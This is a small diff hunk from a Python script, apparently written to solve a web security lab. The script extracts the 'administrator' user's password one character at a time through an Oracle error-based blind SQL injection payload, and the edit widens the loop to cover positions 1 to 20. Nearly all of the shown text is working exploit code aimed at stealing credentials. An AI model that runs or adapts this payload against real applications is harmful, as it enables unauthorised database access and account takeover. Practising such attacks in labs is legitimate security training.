@@ -10,7 +10,7 @@ proxies = {'http': 'http://127.0.0.1:8080'}
 
 def sqli_password(url):
     password_extracted = ""
-    for i in range(17,21):
+    for i in range(1,21):
         for j in range(32,126):
             sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
